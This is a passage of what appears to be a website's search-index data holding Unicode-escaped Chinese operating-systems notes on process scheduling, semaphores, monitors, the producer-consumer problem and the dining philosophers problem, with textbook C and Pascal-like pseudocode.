\u7531\u4E8E\u521B\u5EFA\u6216\u64A4\u9500\u8FDB\u7A0B\u65F6\uFF0C\u7CFB\u7EDF\u90FD\u8981\u4E3A\u4E4B\u5206\u914D\u6216\u56DE\u6536\u8D44\u6E90\uFF0C\u5982\u5185\u5B58\u7A7A\u95F4\u3001I/O \u8BBE\u5907\u7B49\uFF0C\u6240\u4ED8\u51FA\u7684\u5F00\u9500\u8FDC\u5927\u4E8E\u521B\u5EFA\u6216\u64A4\u9500\u7EBF\u7A0B\u65F6\u7684\u5F00\u9500\u3002\u7C7B\u4F3C\u5730\uFF0C\u5728\u8FDB\u884C\u8FDB\u7A0B\u5207\u6362\u65F6\uFF0C\u6D89\u53CA\u5F53\u524D\u6267\u884C\u8FDB\u7A0B CPU \u73AF\u5883\u7684\u4FDD\u5B58\u53CA\u65B0\u8C03\u5EA6\u8FDB\u7A0B CPU \u73AF\u5883\u7684\u8BBE\u7F6E\uFF0C\u800C\u7EBF\u7A0B\u5207\u6362\u65F6\u53EA\u9700\u4FDD\u5B58\u548C\u8BBE\u7F6E\u5C11\u91CF\u5BC4\u5B58\u5668\u5185\u5BB9\uFF0C\u5F00\u9500\u5F88\u5C0F\u3002
\u2163 \u901A\u4FE1\u65B9\u9762
\u7EBF\u7A0B\u95F4\u53EF\u4EE5\u901A\u8FC7\u76F4\u63A5\u8BFB\u5199\u540C\u4E00\u8FDB\u7A0B\u4E2D\u7684\u6570\u636E\u8FDB\u884C\u901A\u4FE1\uFF0C\u4F46\u662F\u8FDB\u7A0B\u901A\u4FE1\u9700\u8981\u501F\u52A9 IPC\u3002`},{header:"\u8FDB\u7A0B\u72B6\u6001\u7684\u5207\u6362",slug:"\u8FDB\u7A0B\u72B6\u6001\u7684\u5207\u6362",content:`![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ProcessState.png" width="500) \u5C31\u7EEA\u72B6\u6001\uFF08ready\uFF09\uFF1A\u7B49\u5F85\u88AB\u8C03\u5EA6
\u8FD0\u884C\u72B6\u6001\uFF08running\uFF09
\u963B\u585E\u72B6\u6001\uFF08waiting\uFF09\uFF1A\u7B49\u5F85\u8D44\u6E90 \u5E94\u8BE5\u6CE8\u610F\u4EE5\u4E0B\u5185\u5BB9\uFF1A \u53EA\u6709\u5C31\u7EEA\u6001\u548C\u8FD0\u884C\u6001\u53EF\u4EE5\u76F8\u4E92\u8F6C\u6362\uFF0C\u5176\u5B83\u7684\u90FD\u662F\u5355\u5411\u8F6C\u6362\u3002\u5C31\u7EEA\u72B6\u6001\u7684\u8FDB\u7A0B\u901A\u8FC7\u8C03\u5EA6\u7B97\u6CD5\u4ECE\u800C\u83B7\u5F97 CPU \u65F6\u95F4\uFF0C\u8F6C\u4E3A\u8FD0\u884C\u72B6\u6001\uFF1B\u800C\u8FD0\u884C\u72B6\u6001\u7684\u8FDB\u7A0B\uFF0C\u5728\u5206\u914D\u7ED9\u5B83\u7684 CPU \u65F6\u95F4\u7247\u7528\u5B8C\u4E4B\u540E\u5C31\u4F1A\u8F6C\u4E3A\u5C31\u7EEA\u72B6\u6001\uFF0C\u7B49\u5F85\u4E0B\u4E00\u6B21\u8C03\u5EA6\u3002
\u963B\u585E\u72B6\u6001\u662F\u7F3A\u5C11\u9700\u8981\u7684\u8D44\u6E90\u4ECE\u800C\u7531\u8FD0\u884C\u72B6\u6001\u8F6C\u6362\u800C\u6765\uFF0C\u4F46\u662F\u8BE5\u8D44\u6E90\u4E0D\u5305\u62EC CPU \u65F6\u95F4\uFF0C\u7F3A\u5C11 CPU \u65F6\u95F4\u4F1A\u4ECE\u8FD0\u884C\u6001\u8F6C\u6362\u4E3A\u5C31\u7EEA\u6001\u3002`},{header:"\u8FDB\u7A0B\u8C03\u5EA6\u7B97\u6CD5",slug:"\u8FDB\u7A0B\u8C03\u5EA6\u7B97\u6CD5",content:"\u4E0D\u540C\u73AF\u5883\u7684\u8C03\u5EA6\u7B97\u6CD5\u76EE\u6807\u4E0D\u540C\uFF0C\u56E0\u6B64\u9700\u8981\u9488\u5BF9\u4E0D\u540C\u73AF\u5883\u6765\u8BA8\u8BBA\u8C03\u5EA6\u7B97\u6CD5\u3002"},{header:"1. \u6279\u5904\u7406\u7CFB\u7EDF",slug:"_1-\u6279\u5904\u7406\u7CFB\u7EDF",content:`\u6279\u5904\u7406\u7CFB\u7EDF\u6CA1\u6709\u592A\u591A\u7684\u7528\u6237\u64CD\u4F5C\uFF0C\u5728\u8BE5\u7CFB\u7EDF\u4E2D\uFF0C\u8C03\u5EA6\u7B97\u6CD5\u76EE\u6807\u662F\u4FDD\u8BC1\u541E\u5410\u91CF\u548C\u5468\u8F6C\u65F6\u95F4\uFF08\u4ECE\u63D0\u4EA4\u5230\u7EC8\u6B62\u7684\u65F6\u95F4\uFF09\u3002
1.1 \u5148\u6765\u5148\u670D\u52A1 first-come first-serverd\uFF08FCFS\uFF09
\u975E\u62A2\u5360\u5F0F\u7684\u8C03\u5EA6\u7B97\u6CD5\uFF0C\u6309\u7167\u8BF7\u6C42\u7684\u987A\u5E8F\u8FDB\u884C\u8C03\u5EA6\u3002
\u6709\u5229\u4E8E\u957F\u4F5C\u4E1A\uFF0C\u4F46\u4E0D\u5229\u4E8E\u77ED\u4F5C\u4E1A\uFF0C\u56E0\u4E3A\u77ED\u4F5C\u4E1A\u5FC5\u987B\u4E00\u76F4\u7B49\u5F85\u524D\u9762\u7684\u957F\u4F5C\u4E1A\u6267\u884C\u5B8C\u6BD5\u624D\u80FD\u6267\u884C\uFF0C\u800C\u957F\u4F5C\u4E1A\u53C8\u9700\u8981\u6267\u884C\u5F88\u957F\u65F6\u95F4\uFF0C\u9020\u6210\u4E86\u77ED\u4F5C\u4E1A\u7B49\u5F85\u65F6\u95F4\u8FC7\u957F\u3002
1.2 \u77ED\u4F5C\u4E1A\u4F18\u5148 shortest job first\uFF08SJF\uFF09
\u975E\u62A2\u5360\u5F0F\u7684\u8C03\u5EA6\u7B97\u6CD5\uFF0C\u6309\u4F30\u8BA1\u8FD0\u884C\u65F6\u95F4\u6700\u77ED\u7684\u987A\u5E8F\u8FDB\u884C\u8C03\u5EA6\u3002
\u957F\u4F5C\u4E1A\u6709\u53EF\u80FD\u4F1A\u997F\u6B7B\uFF0C\u5904\u4E8E\u4E00\u76F4\u7B49\u5F85\u77ED\u4F5C\u4E1A\u6267\u884C\u5B8C\u6BD5\u7684\u72B6\u6001\u3002\u56E0\u4E3A\u5982\u679C\u4E00\u76F4\u6709\u77ED\u4F5C\u4E1A\u5230\u6765\uFF0C\u90A3\u4E48\u957F\u4F5C\u4E1A\u6C38\u8FDC\u5F97\u4E0D\u5230\u8C03\u5EA6\u3002
1.3 \u6700\u77ED\u5269\u4F59\u65F6\u95F4\u4F18\u5148 shortest remaining time next\uFF08SRTN\uFF09
\u6700\u77ED\u4F5C\u4E1A\u4F18\u5148\u7684\u62A2\u5360\u5F0F\u7248\u672C\uFF0C\u6309\u5269\u4F59\u8FD0\u884C\u65F6\u95F4\u7684\u987A\u5E8F\u8FDB\u884C\u8C03\u5EA6\u3002 \u5F53\u4E00\u4E2A\u65B0\u7684\u4F5C\u4E1A\u5230\u8FBE\u65F6\uFF0C\u5176\u6574\u4E2A\u8FD0\u884C\u65F6\u95F4\u4E0E\u5F53\u524D\u8FDB\u7A0B\u7684\u5269\u4F59\u65F6\u95F4\u4F5C\u6BD4\u8F83\u3002\u5982\u679C\u65B0\u7684\u8FDB\u7A0B\u9700\u8981\u7684\u65F6\u95F4\u66F4\u5C11\uFF0C\u5219\u6302\u8D77\u5F53\u524D\u8FDB\u7A0B\uFF0C\u8FD0\u884C\u65B0\u7684\u8FDB\u7A0B\u3002\u5426\u5219\u65B0\u7684\u8FDB\u7A0B\u7B49\u5F85\u3002`},{header:"2. \u4EA4\u4E92\u5F0F\u7CFB\u7EDF",slug:"_2-\u4EA4\u4E92\u5F0F\u7CFB\u7EDF",content:`\u4EA4\u4E92\u5F0F\u7CFB\u7EDF\u6709\u5927\u91CF\u7684\u7528\u6237\u4EA4\u4E92\u64CD\u4F5C\uFF0C\u5728\u8BE5\u7CFB\u7EDF\u4E2D\u8C03\u5EA6\u7B97\u6CD5\u7684\u76EE\u6807\u662F\u5FEB\u901F\u5730\u8FDB\u884C\u54CD\u5E94\u3002
2.1 \u65F6\u95F4\u7247\u8F6E\u8F6C
\u5C06\u6240\u6709\u5C31\u7EEA\u8FDB\u7A0B\u6309 FCFS \u7684\u539F\u5219\u6392\u6210\u4E00\u4E2A\u961F\u5217\uFF0C\u6BCF\u6B21\u8C03\u5EA6\u65F6\uFF0C\u628A CPU \u65F6\u95F4\u5206\u914D\u7ED9\u961F\u9996\u8FDB\u7A0B\uFF0C\u8BE5\u8FDB\u7A0B\u53EF\u4EE5\u6267\u884C\u4E00\u4E2A\u65F6\u95F4\u7247\u3002\u5F53\u65F6\u95F4\u7247\u7528\u5B8C\u65F6\uFF0C\u7531\u8BA1\u65F6\u5668\u53D1\u51FA\u65F6\u949F\u4E2D\u65AD\uFF0C\u8C03\u5EA6\u7A0B\u5E8F\u4FBF\u505C\u6B62\u8BE5\u8FDB\u7A0B\u7684\u6267\u884C\uFF0C\u5E76\u5C06\u5B83\u9001\u5F80\u5C31\u7EEA\u961F\u5217\u7684\u672B\u5C3E\uFF0C\u540C\u65F6\u7EE7\u7EED\u628A CPU \u65F6\u95F4\u5206\u914D\u7ED9\u961F\u9996\u7684\u8FDB\u7A0B\u3002
\u65F6\u95F4\u7247\u8F6E\u8F6C\u7B97\u6CD5\u7684\u6548\u7387\u548C\u65F6\u95F4\u7247\u7684\u5927\u5C0F\u6709\u5F88\u5927\u5173\u7CFB\uFF1A \u56E0\u4E3A\u8FDB\u7A0B\u5207\u6362\u90FD\u8981\u4FDD\u5B58\u8FDB\u7A0B\u7684\u4FE1\u606F\u5E76\u4E14\u8F7D\u5165\u65B0\u8FDB\u7A0B\u7684\u4FE1\u606F\uFF0C\u5982\u679C\u65F6\u95F4\u7247\u592A\u5C0F\uFF0C\u4F1A\u5BFC\u81F4\u8FDB\u7A0B\u5207\u6362\u5F97\u592A\u9891\u7E41\uFF0C\u5728\u8FDB\u7A0B\u5207\u6362\u4E0A\u5C31\u4F1A\u82B1\u8FC7\u591A\u65F6\u95F4\u3002
\u800C\u5982\u679C\u65F6\u95F4\u7247\u8FC7\u957F\uFF0C\u90A3\u4E48\u5B9E\u65F6\u6027\u5C31\u4E0D\u80FD\u5F97\u5230\u4FDD\u8BC1\u3002 2.2 \u4F18\u5148\u7EA7\u8C03\u5EA6
\u4E3A\u6BCF\u4E2A\u8FDB\u7A0B\u5206\u914D\u4E00\u4E2A\u4F18\u5148\u7EA7\uFF0C\u6309\u4F18\u5148\u7EA7\u8FDB\u884C\u8C03\u5EA6\u3002
\u4E3A\u4E86\u9632\u6B62\u4F4E\u4F18\u5148\u7EA7\u7684\u8FDB\u7A0B\u6C38\u8FDC\u7B49\u4E0D\u5230\u8C03\u5EA6\uFF0C\u53EF\u4EE5\u968F\u7740\u65F6\u95F4\u7684\u63A8\u79FB\u589E\u52A0\u7B49\u5F85\u8FDB\u7A0B\u7684\u4F18\u5148\u7EA7\u3002
2.3 \u591A\u7EA7\u53CD\u9988\u961F\u5217
\u4E00\u4E2A\u8FDB\u7A0B\u9700\u8981\u6267\u884C 100 \u4E2A\u65F6\u95F4\u7247\uFF0C\u5982\u679C\u91C7\u7528\u65F6\u95F4\u7247\u8F6E\u8F6C\u8C03\u5EA6\u7B97\u6CD5\uFF0C\u90A3\u4E48\u9700\u8981\u4EA4\u6362 100 \u6B21\u3002
\u591A\u7EA7\u961F\u5217\u662F\u4E3A\u8FD9\u79CD\u9700\u8981\u8FDE\u7EED\u6267\u884C\u591A\u4E2A\u65F6\u95F4\u7247\u7684\u8FDB\u7A0B\u8003\u8651\uFF0C\u5B83\u8BBE\u7F6E\u4E86\u591A\u4E2A\u961F\u5217\uFF0C\u6BCF\u4E2A\u961F\u5217\u65F6\u95F4\u7247\u5927\u5C0F\u90FD\u4E0D\u540C\uFF0C\u4F8B\u5982 1,2,4,8,..\u3002\u8FDB\u7A0B\u5728\u7B2C\u4E00\u4E2A\u961F\u5217\u6CA1\u6267\u884C\u5B8C\uFF0C\u5C31\u4F1A\u88AB\u79FB\u5230\u4E0B\u4E00\u4E2A\u961F\u5217\u3002\u8FD9\u79CD\u65B9\u5F0F\u4E0B\uFF0C\u4E4B\u524D\u7684\u8FDB\u7A0B\u53EA\u9700\u8981\u4EA4\u6362 7 \u6B21\u3002
\u6BCF\u4E2A\u961F\u5217\u4F18\u5148\u6743\u4E5F\u4E0D\u540C\uFF0C\u6700\u4E0A\u9762\u7684\u4F18\u5148\u6743\u6700\u9AD8\u3002\u56E0\u6B64\u53EA\u6709\u4E0A\u4E00\u4E2A\u961F\u5217\u6CA1\u6709\u8FDB\u7A0B\u5728\u6392\u961F\uFF0C\u624D\u80FD\u8C03\u5EA6\u5F53\u524D\u961F\u5217\u4E0A\u7684\u8FDB\u7A0B\u3002
\u53EF\u4EE5\u5C06\u8FD9\u79CD\u8C03\u5EA6\u7B97\u6CD5\u770B\u6210\u662F\u65F6\u95F4\u7247\u8F6E\u8F6C\u8C03\u5EA6\u7B97\u6CD5\u548C\u4F18\u5148\u7EA7\u8C03\u5EA6\u7B97\u6CD5\u7684\u7ED3\u5408\u3002`},{header:"3. \u5B9E\u65F6\u7CFB\u7EDF",slug:"_3-\u5B9E\u65F6\u7CFB\u7EDF",content:`\u5B9E\u65F6\u7CFB\u7EDF\u8981\u6C42\u4E00\u4E2A\u8BF7\u6C42\u5728\u4E00\u4E2A\u786E\u5B9A\u65F6\u95F4\u5185\u5F97\u5230\u54CD\u5E94\u3002
\u5206\u4E3A\u786C\u5B9E\u65F6\u548C\u8F6F\u5B9E\u65F6\uFF0C\u524D\u8005\u5FC5\u987B\u6EE1\u8DB3\u7EDD\u5BF9\u7684\u622A\u6B62\u65F6\u95F4\uFF0C\u540E\u8005\u53EF\u4EE5\u5BB9\u5FCD\u4E00\u5B9A\u7684\u8D85\u65F6\u3002`},{header:"\u8FDB\u7A0B\u540C\u6B65",slug:"\u8FDB\u7A0B\u540C\u6B65",content:""},{header:"1. \u4E34\u754C\u533A",slug:"_1-\u4E34\u754C\u533A",content:`\u5BF9\u4E34\u754C\u8D44\u6E90\u8FDB\u884C\u8BBF\u95EE\u7684\u90A3\u6BB5\u4EE3\u7801\u79F0\u4E3A\u4E34\u754C\u533A\u3002
\u4E3A\u4E86\u4E92\u65A5\u8BBF\u95EE\u4E34\u754C\u8D44\u6E90\uFF0C\u6BCF\u4E2A\u8FDB\u7A0B\u5728\u8FDB\u5165\u4E34\u754C\u533A\u4E4B\u524D\uFF0C\u9700\u8981\u5148\u8FDB\u884C\u68C0\u67E5\u3002
// entry section
// critical section;
// exit section`},{header:"2. \u540C\u6B65\u4E0E\u4E92\u65A5",slug:"_2-\u540C\u6B65\u4E0E\u4E92\u65A5",content:`\u540C\u6B65\uFF1A\u591A\u4E2A\u8FDB\u7A0B\u56E0\u4E3A\u5408\u4F5C\u4EA7\u751F\u7684\u76F4\u63A5\u5236\u7EA6\u5173\u7CFB\uFF0C\u4F7F\u5F97\u8FDB\u7A0B\u6709\u4E00\u5B9A\u7684\u5148\u540E\u6267\u884C\u5173\u7CFB\u3002
\u4E92\u65A5\uFF1A\u591A\u4E2A\u8FDB\u7A0B\u5728\u540C\u4E00\u65F6\u523B\u53EA\u6709\u4E00\u4E2A\u8FDB\u7A0B\u80FD\u8FDB\u5165\u4E34\u754C\u533A\u3002`},{header:"3. \u4FE1\u53F7\u91CF",slug:"_3-\u4FE1\u53F7\u91CF",content:`\u4FE1\u53F7\u91CF\uFF08Semaphore\uFF09\u662F\u4E00\u4E2A\u6574\u578B\u53D8\u91CF\uFF0C\u53EF\u4EE5\u5BF9\u5176\u6267\u884C down \u548C up \u64CD\u4F5C\uFF0C\u4E5F\u5C31\u662F\u5E38\u89C1\u7684 P \u548C V \u64CD\u4F5C\u3002 down : \u5982\u679C\u4FE1\u53F7\u91CF\u5927\u4E8E 0 \uFF0C\u6267\u884C -1 \u64CD\u4F5C\uFF1B\u5982\u679C\u4FE1\u53F7\u91CF\u7B49\u4E8E 0\uFF0C\u8FDB\u7A0B\u7761\u7720\uFF0C\u7B49\u5F85\u4FE1\u53F7\u91CF\u5927\u4E8E 0\uFF1B
up \uFF1A\u5BF9\u4FE1\u53F7\u91CF\u6267\u884C +1 \u64CD\u4F5C\uFF0C\u5524\u9192\u7761\u7720\u7684\u8FDB\u7A0B\u8BA9\u5176\u5B8C\u6210 down \u64CD\u4F5C\u3002 down \u548C up \u64CD\u4F5C\u9700\u8981\u88AB\u8BBE\u8BA1\u6210\u539F\u8BED\uFF0C\u4E0D\u53EF\u5206\u5272\uFF0C\u901A\u5E38\u7684\u505A\u6CD5\u662F\u5728\u6267\u884C\u8FD9\u4E9B\u64CD\u4F5C\u7684\u65F6\u5019\u5C4F\u853D\u4E2D\u65AD\u3002
\u5982\u679C\u4FE1\u53F7\u91CF\u7684\u53D6\u503C\u53EA\u80FD\u4E3A 0 \u6216\u8005 1\uFF0C\u90A3\u4E48\u5C31\u6210\u4E3A\u4E86 \u4E92\u65A5\u91CF\uFF08Mutex\uFF09 \uFF0C0 \u8868\u793A\u4E34\u754C\u533A\u5DF2\u7ECF\u52A0\u9501\uFF0C1 \u8868\u793A\u4E34\u754C\u533A\u89E3\u9501\u3002
typedef int semaphore;
semaphore mutex = 1;
void P1() { down(&mutex); // \u4E34\u754C\u533A up(&mutex);
} void P2() { down(&mutex); // \u4E34\u754C\u533A up(&mutex);
}
**\u4F7F\u7528\u4FE1\u53F7\u91CF\u5B9E\u73B0\u751F\u4EA7\u8005-\u6D88\u8D39\u8005\u95EE\u9898** \u95EE\u9898\u63CF\u8FF0\uFF1A\u4F7F\u7528\u4E00\u4E2A\u7F13\u51B2\u533A\u6765\u4FDD\u5B58\u7269\u54C1\uFF0C\u53EA\u6709\u7F13\u51B2\u533A\u6CA1\u6709\u6EE1\uFF0C\u751F\u4EA7\u8005\u624D\u53EF\u4EE5\u653E\u5165\u7269\u54C1\uFF1B\u53EA\u6709\u7F13\u51B2\u533A\u4E0D\u4E3A\u7A7A\uFF0C\u6D88\u8D39\u8005\u624D\u53EF\u4EE5\u62FF\u8D70\u7269\u54C1\u3002
\u56E0\u4E3A\u7F13\u51B2\u533A\u5C5E\u4E8E\u4E34\u754C\u8D44\u6E90\uFF0C\u56E0\u6B64\u9700\u8981\u4F7F\u7528\u4E00\u4E2A\u4E92\u65A5\u91CF mutex \u6765\u63A7\u5236\u5BF9\u7F13\u51B2\u533A\u7684\u4E92\u65A5\u8BBF\u95EE\u3002
\u4E3A\u4E86\u540C\u6B65\u751F\u4EA7\u8005\u548C\u6D88\u8D39\u8005\u7684\u884C\u4E3A\uFF0C\u9700\u8981\u8BB0\u5F55\u7F13\u51B2\u533A\u4E2D\u7269\u54C1\u7684\u6570\u91CF\u3002\u6570\u91CF\u53EF\u4EE5\u4F7F\u7528\u4FE1\u53F7\u91CF\u6765\u8FDB\u884C\u7EDF\u8BA1\uFF0C\u8FD9\u91CC\u9700\u8981\u4F7F\u7528\u4E24\u4E2A\u4FE1\u53F7\u91CF\uFF1Aempty \u8BB0\u5F55\u7A7A\u7F13\u51B2\u533A\u7684\u6570\u91CF\uFF0Cfull \u8BB0\u5F55\u6EE1\u7F13\u51B2\u533A\u7684\u6570\u91CF\u3002\u5176\u4E2D\uFF0Cempty \u4FE1\u53F7\u91CF\u662F\u5728\u751F\u4EA7\u8005\u8FDB\u7A0B\u4E2D\u4F7F\u7528\uFF0C\u5F53 empty \u4E0D\u4E3A 0 \u65F6\uFF0C\u751F\u4EA7\u8005\u624D\u53EF\u4EE5\u653E\u5165\u7269\u54C1\uFF1Bfull \u4FE1\u53F7\u91CF\u662F\u5728\u6D88\u8D39\u8005\u8FDB\u7A0B\u4E2D\u4F7F\u7528\uFF0C\u5F53 full \u4FE1\u53F7\u91CF\u4E0D\u4E3A 0 \u65F6\uFF0C\u6D88\u8D39\u8005\u624D\u53EF\u4EE5\u53D6\u8D70\u7269\u54C1\u3002
\u6CE8\u610F\uFF0C\u4E0D\u80FD\u5148\u5BF9\u7F13\u51B2\u533A\u8FDB\u884C\u52A0\u9501\uFF0C\u518D\u6D4B\u8BD5\u4FE1\u53F7\u91CF\u3002\u4E5F\u5C31\u662F\u8BF4\uFF0C\u4E0D\u80FD\u5148\u6267\u884C down(mutex) \u518D\u6267\u884C down(empty)\u3002\u5982\u679C\u8FD9\u4E48\u505A\u4E86\uFF0C\u90A3\u4E48\u53EF\u80FD\u4F1A\u51FA\u73B0\u8FD9\u79CD\u60C5\u51B5\uFF1A\u751F\u4EA7\u8005\u5BF9\u7F13\u51B2\u533A\u52A0\u9501\u540E\uFF0C\u6267\u884C down(empty) \u64CD\u4F5C\uFF0C\u53D1\u73B0 empty = 0\uFF0C\u6B64\u65F6\u751F\u4EA7\u8005\u7761\u7720\u3002\u6D88\u8D39\u8005\u4E0D\u80FD\u8FDB\u5165\u4E34\u754C\u533A\uFF0C\u56E0\u4E3A\u751F\u4EA7\u8005\u5BF9\u7F13\u51B2\u533A\u52A0\u9501\u4E86\uFF0C\u6D88\u8D39\u8005\u5C31\u65E0\u6CD5\u6267\u884C up(empty) \u64CD\u4F5C\uFF0Cempty \u6C38\u8FDC\u90FD\u4E3A 0\uFF0C\u5BFC\u81F4\u751F\u4EA7\u8005\u6C38\u8FDC\u7B49\u5F85\u4E0B\uFF0C\u4E0D\u4F1A\u91CA\u653E\u9501\uFF0C\u6D88\u8D39\u8005\u56E0\u6B64\u4E5F\u4F1A\u6C38\u8FDC\u7B49\u5F85\u4E0B\u53BB\u3002
#define N 100
typedef int semaphore;
semaphore mutex = 1;
semaphore empty = N;
semaphore full = 0; void producer() { while(TRUE) { int item = produce_item(); down(&empty); down(&mutex); insert_item(item); up(&mutex); up(&full); }
} void consumer() { while(TRUE) { down(&full); down(&mutex); int item = remove_item(); consume_item(item); up(&mutex); up(&empty); }
}`},{header:"4. \u7BA1\u7A0B",slug:"_4-\u7BA1\u7A0B",content:`\u4F7F\u7528\u4FE1\u53F7\u91CF\u673A\u5236\u5B9E\u73B0\u7684\u751F\u4EA7\u8005\u6D88\u8D39\u8005\u95EE\u9898\u9700\u8981\u5BA2\u6237\u7AEF\u4EE3\u7801\u505A\u5F88\u591A\u63A7\u5236\uFF0C\u800C\u7BA1\u7A0B\u628A\u63A7\u5236\u7684\u4EE3\u7801\u72EC\u7ACB\u51FA\u6765\uFF0C\u4E0D\u4EC5\u4E0D\u5BB9\u6613\u51FA\u9519\uFF0C\u4E5F\u4F7F\u5F97\u5BA2\u6237\u7AEF\u4EE3\u7801\u8C03\u7528\u66F4\u5BB9\u6613\u3002
c \u8BED\u8A00\u4E0D\u652F\u6301\u7BA1\u7A0B\uFF0C\u4E0B\u9762\u7684\u793A\u4F8B\u4EE3\u7801\u4F7F\u7528\u4E86\u7C7B Pascal \u8BED\u8A00\u6765\u63CF\u8FF0\u7BA1\u7A0B\u3002\u793A\u4F8B\u4EE3\u7801\u7684\u7BA1\u7A0B\u63D0\u4F9B\u4E86 insert() \u548C remove() \u65B9\u6CD5\uFF0C\u5BA2\u6237\u7AEF\u4EE3\u7801\u901A\u8FC7\u8C03\u7528\u8FD9\u4E24\u4E2A\u65B9\u6CD5\u6765\u89E3\u51B3\u751F\u4EA7\u8005-\u6D88\u8D39\u8005\u95EE\u9898\u3002
monitor ProducerConsumer integer i; condition c; procedure insert(); begin // ... end; procedure remove(); begin // ... end;
end monitor;
\u7BA1\u7A0B\u6709\u4E00\u4E2A\u91CD\u8981\u7279\u6027\uFF1A\u5728\u4E00\u4E2A\u65F6\u523B\u53EA\u80FD\u6709\u4E00\u4E2A\u8FDB\u7A0B\u4F7F\u7528\u7BA1\u7A0B\u3002\u8FDB\u7A0B\u5728\u65E0\u6CD5\u7EE7\u7EED\u6267\u884C\u7684\u65F6\u5019\u4E0D\u80FD\u4E00\u76F4\u5360\u7528\u7BA1\u7A0B\uFF0C\u5426\u5219\u5176\u5B83\u8FDB\u7A0B\u6C38\u8FDC\u4E0D\u80FD\u4F7F\u7528\u7BA1\u7A0B\u3002
\u7BA1\u7A0B\u5F15\u5165\u4E86 \u6761\u4EF6\u53D8\u91CF \u4EE5\u53CA\u76F8\u5173\u7684\u64CD\u4F5C\uFF1Await() \u548C signal() \u6765\u5B9E\u73B0\u540C\u6B65\u64CD\u4F5C\u3002\u5BF9\u6761\u4EF6\u53D8\u91CF\u6267\u884C wait() \u64CD\u4F5C\u4F1A\u5BFC\u81F4\u8C03\u7528\u8FDB\u7A0B\u963B\u585E\uFF0C\u628A\u7BA1\u7A0B\u8BA9\u51FA\u6765\u7ED9\u53E6\u4E00\u4E2A\u8FDB\u7A0B\u6301\u6709\u3002signal() \u64CD\u4F5C\u7528\u4E8E\u5524\u9192\u88AB\u963B\u585E\u7684\u8FDB\u7A0B\u3002
\u4F7F\u7528\u7BA1\u7A0B\u5B9E\u73B0\u751F\u4EA7\u8005-\u6D88\u8D39\u8005\u95EE\u9898
// \u7BA1\u7A0B
monitor ProducerConsumer condition full, empty; integer count := 0; condition c; procedure insert(item: integer); begin if count = N then wait(full); insert_item(item); count := count + 1; if count = 1 then signal(empty); end; function remove: integer; begin if count = 0 then wait(empty); remove = remove_item; count := count - 1; if count = N -1 then signal(full); end;
end monitor; // \u751F\u4EA7\u8005\u5BA2\u6237\u7AEF
procedure producer
begin while true do begin item = produce_item; ProducerConsumer.insert(item); end
end; // \u6D88\u8D39\u8005\u5BA2\u6237\u7AEF
procedure consumer
begin while true do begin item = ProducerConsumer.remove; consume_item(item); end
end;`},{header:"\u7ECF\u5178\u540C\u6B65\u95EE\u9898",slug:"\u7ECF\u5178\u540C\u6B65\u95EE\u9898",content:"\u751F\u4EA7\u8005\u548C\u6D88\u8D39\u8005\u95EE\u9898\u524D\u9762\u5DF2\u7ECF\u8BA8\u8BBA\u8FC7\u4E86\u3002"},{header:"1. \u54F2\u5B66\u5BB6\u8FDB\u9910\u95EE\u9898",slug:"_1-\u54F2\u5B66\u5BB6\u8FDB\u9910\u95EE\u9898",content:`\u4E94\u4E2A\u54F2\u5B66\u5BB6\u56F4\u7740\u4E00\u5F20\u5706\u684C\uFF0C\u6BCF\u4E2A\u54F2\u5B66\u5BB6\u9762\u524D\u653E\u7740\u98DF\u7269\u3002\u54F2\u5B66\u5BB6\u7684\u751F\u6D3B\u6709\u4E24\u79CD\u4EA4\u66FF\u6D3B\u52A8\uFF1A\u5403\u996D\u4EE5\u53CA\u601D\u8003\u3002\u5F53\u4E00\u4E2A\u54F2\u5B66\u5BB6\u5403\u996D\u65F6\uFF0C\u9700\u8981\u5148\u62FF\u8D77\u81EA\u5DF1\u5DE6\u53F3\u4E24\u8FB9\u7684\u4E24\u6839\u7B77\u5B50\uFF0C\u5E76\u4E14\u4E00\u6B21\u53EA\u80FD\u62FF\u8D77\u4E00\u6839\u7B77\u5B50\u3002
\u4E0B\u9762\u662F\u4E00\u79CD\u9519\u8BEF\u7684\u89E3\u6CD5\uFF0C\u5982\u679C\u6240\u6709\u54F2\u5B66\u5BB6\u540C\u65F6\u62FF\u8D77\u5DE6\u624B\u8FB9\u7684\u7B77\u5B50\uFF0C\u90A3\u4E48\u6240\u6709\u54F2\u5B66\u5BB6\u90FD\u5728\u7B49\u5F85\u5176\u5B83\u54F2\u5B66\u5BB6\u5403\u5B8C\u5E76\u91CA\u653E\u81EA\u5DF1\u624B\u4E2D\u7684\u7B77\u5B50\uFF0C\u5BFC\u81F4\u6B7B\u9501\u3002
#define N 5 void philosopher(int i) { while(TRUE) { think(); take(i); // \u62FF\u8D77\u5DE6\u8FB9\u7684\u7B77\u5B50 take((i+1)%N); // \u62FF\u8D77\u53F3\u8FB9\u7684\u7B77\u5B50 eat(); put(i); put((i+1)%N); }
}
\u4E3A\u4E86\u9632\u6B62\u6B7B\u9501\u7684\u53D1\u751F\uFF0C\u53EF\u4EE5\u8BBE\u7F6E\u4E24\u4E2A\u6761\u4EF6\uFF1A \u5FC5\u987B\u540C\u65F6\u62FF\u8D77\u5DE6\u53F3\u4E24\u6839\u7B77\u5B50\uFF1B
\u53EA\u6709\u5728\u4E24\u4E2A\u90BB\u5C45\u90FD\u6CA1\u6709\u8FDB\u9910\u7684\u60C5\u51B5\u4E0B\u624D\u5141\u8BB8\u8FDB\u9910\u3002 #define N 5
#define LEFT (i + N - 1) % N // \u5DE6\u90BB\u5C45
#define RIGHT (i + 1) % N // \u53F3\u90BB\u5C45
#define THINKING 0
#define HUNGRY 1
#define EATING 2
typedef int semaphore;
int state[N]; // \u8DDF\u8E2A\u6BCF\u4E2A\u54F2\u5B66\u5BB6\u7684\u72B6\u6001
semaphore mutex = 1; // \u4E34\u754C\u533A\u7684\u4E92\u65A5\uFF0C\u4E34\u754C\u533A\u662F state \u6570\u7EC4\uFF0C\u5BF9\u5176\u4FEE\u6539\u9700\u8981\u4E92\u65A5
semaphore s[N]; // \u6BCF\u4E2A\u54F2\u5B66\u5BB6\u4E00\u4E2A\u4FE1\u53F7\u91CF void philosopher(int i) { while(TRUE) { think(i); take_two(i); eat(i); put_two(i); }
} void take_two(int i) { down(&mutex); state[i] = HUNGRY; check(i); up(&mutex); down(&s[i]); // \u53EA\u6709\u6536\u5230\u901A\u77E5\u4E4B\u540E\u624D\u53EF\u4EE5\u5F00\u59CB\u5403\uFF0C\u5426\u5219\u4F1A\u4E00\u76F4\u7B49\u4E0B\u53BB
